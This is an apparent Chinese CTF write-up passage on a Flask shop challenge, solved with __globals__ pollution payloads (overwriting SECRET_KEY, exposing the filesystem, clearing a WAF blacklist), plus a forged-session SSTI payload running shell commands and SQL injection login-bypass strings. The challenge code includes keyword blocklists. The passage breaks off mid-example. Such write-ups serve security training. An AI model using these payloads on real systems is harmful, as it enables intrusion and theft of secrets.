builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"customer"</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'permission'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    error_message <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        error_message <span class="token operator">=</span> <span class="token string">'&lt;p style="color: red; font-size: 0.8em;"&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;'</span>    products <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"美式咖啡"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">9.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"1.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"橙c美式"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">19.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"2.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"摩卡"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">29.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"3.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"卡布奇诺"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">19.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"4.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"冰拿铁"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">29.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"5.png"</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>                         error_message<span class="token operator">=</span>error_message<span class="token punctuation">,</span>                         session<span class="token operator">=</span>session<span class="token punctuation">,</span>                         products<span class="token operator">=</span>products<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/add'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">adddd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''            &lt;html&gt;                &lt;body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;"&gt;                    &lt;h2&gt;添加商品&lt;/h2&gt;                    &lt;form id="productForm"&gt;                        &lt;p&gt;商品名称: &lt;input type="text" id="name"&gt;&lt;/p&gt;                        &lt;p&gt;商品价格: &lt;input type="text" id="price"&gt;&lt;/p&gt;                        &lt;button type="button" onclick="submitForm()"&gt;添加商品&lt;/button&gt;                    &lt;/form&gt;                    &lt;script&gt;                        function submitForm() {                            const nameInput = document.getElementById('name').value;                            const priceInput = document.getElementById('price').value;                            fetch(`/add?price=${encodeURIComponent(priceInput)}`, {                                method: 'POST',                                headers: {                                    'Content-Type': 'application/json',                                },                                body: nameInput                            })                            .then(response =&gt; response.text())                            .then(data =&gt; alert(data))                            .catch(error =&gt; console.error('错误:', error));                        }                    &lt;/script&gt;                &lt;/body&gt;            &lt;/html&gt;        '''</span>    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                raw_data <span class="token operator">=</span> request<span class="token punctuation">.</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> check<span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#检测添加的商品是否合法</span>                    <span class="token keyword">return</span> <span class="token string">"该商品违规，无法上传"</span>                json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>json_data<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">"添加失败1"</span>                merge<span class="token punctuation">(</span>json_data<span class="token punctuation">,</span> add<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">"你无法添加商品哦"</span>            <span class="token keyword">except</span> <span class="token punctuation">(</span>UnicodeDecodeError<span class="token punctuation">,</span> json<span class="token punctuation">.</span>JSONDecodeError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"添加失败2"</span>            <span class="token keyword">except</span> TypeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"添加失败3"</span></span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"添加失败4"</span></span>        <span class="token keyword">return</span> <span class="token string">"添加失败5"</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5014</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 <code>/add</code> 路由中，合并操作的目标是 <code>add</code> 函数（代码中 <code>merge(json_data, add)</code>）</p><p>要修改 <code>app.config['SECRET_KEY']</code>，我们需要通过属性链访问：</p><pre class="line-numbers language-none"><code class="language-none">add (函数) → __globals__ (模块全局变量) → app (Flask 实例) → config (配置字典) → SECRET_KEY<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><code>__init__</code> 是类构造方法，与我们要访问的全局变量无关</p></li><li><p>在 <code>add</code> 函数对象上：</p><ul><li><p><code>add.__init__</code> 存在（所有对象都有）</p></li><li><p>但 <code>add.__init__.__globals__</code> 不存在（因为 <code>__init__</code> 是方法，不是函数）</p></li><li><p>尝试访问 <code>add.__init__.__globals__</code> 实际访问的是 <code>type(add).__init__.__globals__</code>（即类构造方法的全局变量），这不是我们需要的</p></li><li><pre><code>type(add).__init__.__globals__  # 这是类构造方法的全局变量<pre class="line-numbers language-none"><code class="language-none">    - 这个命名空间不包含 Flask `app` 实例    - 修改这里不会影响应用配置```json{       "\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f": {         "\u0061\u0070\u0070": {           "\u0063\u006F\u006E\u0066\u0069\u0067": {             "\u0053\u0045\u0043\u0052\u0045\u0054\u005F\u004B\u0045\u0059": "hack"           }         }       }     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ul></li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token comment"># Flask 应用实例</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"hack"</span>  <span class="token comment"># 设置应用的 secret_key</span><span class="token comment"># 会话数据</span>session_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'permission'</span><span class="token punctuation">:</span> <span class="token string">'{{self.__init__.__globals__.__builtins__["__import__"]("os").popen("ls /").read()}}'</span><span class="token punctuation">}</span><span class="token comment"># 获取会话签名序列化器</span>session_serializer <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>cookie <span class="token operator">=</span> session_serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"伪造的 session cookie:"</span><span class="token punctuation">,</span> cookie<span class="token punctuation">)</span><span class="token comment">#伪造的 session cookie: .eJwdisEKAjEMBX9F3mkXZL37K1ZKl40SSJPSrKfSfzd6mxlmQEsl3FGOyoorGvXK7mwacQwneW05s_KZc8BbbC_if94_LCdryCMhntqsx5XwXBLME9atWSMNE7_cft6pHMs6J-YXPokqFg.aEfEYw.RwLFBiWD42THkrSjh8h9RXCJTyg</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <code>json_data = json.loads(raw_data)</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/de7cc48d358d3a3fbce6ff181c95d0ab.png"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"\u005F\u0073\u0074\u0061\u0074\u0069\u0063\u005F\u0066\u006F\u006C\u0064\u0065\u0072"</span><span class="token operator">:</span><span class="token string">"\u002F"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Unicode编码后访问<code>/static/proc/1/environ</code>即可</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/de8b05965001bce7d59cfc7ba8767b1f.png"></p><p><code>/static/app/app.py</code></p><p>或者</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> json<span class="token keyword">import</span> os<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/aaadminnn'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">and</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'permission'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        permission <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'permission'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check1<span class="token punctuation">(</span>permission<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 检测添加的商品是否合法</span>            <span class="token keyword">return</span> <span class="token string">"非法权限"</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'&lt;script&gt;alert("上传成功！");window.location.href="/aaadminnn";&lt;/script&gt;'</span>        upload_form <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        &lt;h2&gt;商品管理系统&lt;/h2&gt;        &lt;form method=POST enctype=multipart/form-data style="margin:20px;padding:20px;border:1px solid #ccc"&gt;            &lt;h3&gt;上传新商品&lt;/h3&gt;            &lt;input type=file name=file required style="margin:10px"&gt;&lt;br&gt;            &lt;small&gt;支持格式：jpg/png（最大2MB）&lt;/small&gt;&lt;br&gt;            &lt;input type=submit value="立即上传" style="margin:10px;padding:5px 20px"&gt;        &lt;/form&gt;        '''</span>        original_template <span class="token operator">=</span> <span class="token string">'Hello admin!!!Your permissions are{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>permission<span class="token punctuation">)</span>        new_template <span class="token operator">=</span> original_template <span class="token operator">+</span> upload_form        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>new_template<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"&lt;script&gt;alert('You are not an admin');window.location.href='/'&lt;/script&gt;"</span>    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>raw_data<span class="token punctuation">,</span> forbidden_keywords<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    检查原始数据中是否包含禁止的关键词    如果包含禁止关键词返回 True，否则返回 False    """</span>    <span class="token comment"># 设置默认禁止关键词</span>    <span class="token keyword">if</span> forbidden_keywords <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        forbidden_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"app"</span><span class="token punctuation">,</span> <span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"SECRET"</span><span class="token punctuation">,</span> <span class="token string">"pardir"</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"mro"</span><span class="token punctuation">,</span> <span class="token string">"subclasses"</span><span class="token punctuation">,</span> <span class="token string">"builtins"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"open"</span><span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">,</span> <span class="token string">"import"</span><span class="token punctuation">,</span> <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"ls"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"base"</span><span class="token punctuation">,</span> <span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"read"</span><span class="token punctuation">]</span>    <span class="token comment"># 检查是否包含任何禁止关键词</span>    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>keyword <span class="token keyword">in</span> raw_data <span class="token keyword">for</span> keyword <span class="token keyword">in</span> forbidden_keywords<span class="token punctuation">)</span>param_black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'%1c'</span><span class="token punctuation">,</span> <span class="token string">'%1d'</span><span class="token punctuation">,</span> <span class="token string">'%1f'</span><span class="token punctuation">,</span> <span class="token string">'%1e'</span><span class="token punctuation">,</span> <span class="token string">'%20'</span><span class="token punctuation">,</span> <span class="token string">'%2b'</span><span class="token punctuation">,</span> <span class="token string">'%2c'</span><span class="token punctuation">,</span> <span class="token string">'%3c'</span><span class="token punctuation">,</span> <span class="token string">'%3e'</span><span class="token punctuation">,</span> <span class="token string">'%c'</span><span class="token punctuation">,</span> <span class="token string">'%2f'</span><span class="token punctuation">,</span>                    <span class="token string">'b64decode'</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">,</span> <span class="token string">'encode'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'cat'</span><span class="token punctuation">,</span>  <span class="token string">'flag'</span><span class="token punctuation">,</span>  <span class="token string">'set'</span><span class="token punctuation">,</span>  <span class="token string">'self'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span>  <span class="token string">'pop('</span><span class="token punctuation">,</span>                    <span class="token string">'setdefault'</span><span class="token punctuation">,</span> <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'lipsum'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'endfor'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'='</span> <span class="token punctuation">]</span><span class="token comment"># 增强WAF防护</span><span class="token keyword">def</span> <span class="token function">waf_check</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 检查是否有不合法的字符</span>    <span class="token keyword">for</span> black <span class="token keyword">in</span> param_black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> black <span class="token keyword">in</span> value<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token comment"># 检查是否是自动化工具请求</span><span class="token keyword">def</span> <span class="token function">is_automated_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 如果是常见的自动化工具的 User-Agent，返回 True</span>    automated_agents <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fenjing'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'bot'</span><span class="token punctuation">,</span> <span class="token string">'spider'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">any</span><span class="token punctuation">(</span>agent <span class="token keyword">in</span> user_agent <span class="token keyword">for</span> agent <span class="token keyword">in</span> automated_agents<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check1</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> is_automated_request<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Automated tool detected"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment"># 使用WAF机制检查请求的合法性</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> waf_check<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5014</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token comment">//污染</span><span class="token punctuation">{</span><span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"param_black_list"</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"\u0070\u0061\u0072\u0061\u006d\u005f\u0062\u006c\u0061\u0063\u006b\u005f\u006c\u0069\u0073\u0074"</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/592fa2f223332c1ff50a69d40396a729.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3d45851a0f890ea420ea70686d5d31cc.png"></p><hr><h3 id="半成品login"><a href="#半成品login" class="headerlink" title="半成品login"></a>半成品login</h3><p>先admin,admin123登陆，再发现要以hacker****为用户名。发现password处可注入。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">2527</span><span class="token comment">/**/</span><span class="token operator">||</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c77fab20b98e9f775f458549ad8dc4fd.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>q<span class="token operator">&amp;</span>password<span class="token operator">=</span>username<span class="token operator">=</span>fake<span class="token operator">%</span><span class="token number">2527</span><span class="token comment">/**/</span><span class="token operator">||</span><span class="token comment">/**/</span>username<span class="token comment">/**/</span><span class="token operator">like</span><span class="token comment">/**/</span><span class="token operator">%</span><span class="token number">2527</span>hacker<span class="token operator">%</span><span class="token operator">%</span><span class="token number">2527</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'$input'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token string">'$password'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入后变为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> 